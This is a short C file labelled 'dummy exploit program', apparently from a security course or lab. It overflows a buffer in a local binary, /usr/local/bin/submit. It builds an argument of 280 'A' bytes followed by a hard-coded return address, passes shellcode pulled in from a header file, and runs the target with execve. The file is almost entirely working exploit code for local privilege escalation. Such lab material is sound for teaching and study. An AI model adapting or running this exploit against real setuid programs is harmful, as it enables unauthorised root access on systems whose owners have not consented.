/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "/usr/local/src/shellcode.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  char *args[4];
  char *env[1];

  // one way to invoke submit
  //system("/usr/local/bin/submit file.txt message");

  // another way
  int payload = 280;
  int i;

  args[0] = (char *) malloc(payload + strlen(shellcode) + 1);
  for (i = 0; i < payload; ++i) {
    sprintf(args[0] + i, "%c", 'A');
  }
  //target address
  sprintf(args[0] + i, "%c%c%c%c", 0xb8, 0xdf, 0xbf, 0xff);

  args[1] = "-h";
  args[2] = shellcode; 
  args[3] = NULL;
  env[0] = NULL;

  return execve(TARGET, args, NULL);

}